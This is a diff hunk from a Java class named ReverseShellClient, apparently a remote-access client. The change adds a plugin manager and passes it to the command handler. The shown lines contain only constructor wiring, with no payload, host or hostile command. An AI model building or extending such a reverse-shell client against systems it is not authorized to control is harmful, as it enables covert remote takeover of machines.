@@ -8,10 +8,12 @@ public class ReverseShellClient {
     private static final Logger logger = Logger.getLogger(ReverseShellClient.class.getName());
     private final ServerConnection serverConnection;
     private final CommandHandler commandHandler;
+    private final PluginManager pluginManager;
 
     public ReverseShellClient(String serverIp, int serverPort) {
         this.serverConnection = new ServerConnection(serverIp, serverPort);
-        this.commandHandler = new CommandHandler(serverConnection);
+        this.pluginManager = new PluginManager(serverConnection);
+        this.commandHandler = new CommandHandler(serverConnection, pluginManager);
     }
 
     public void start() {
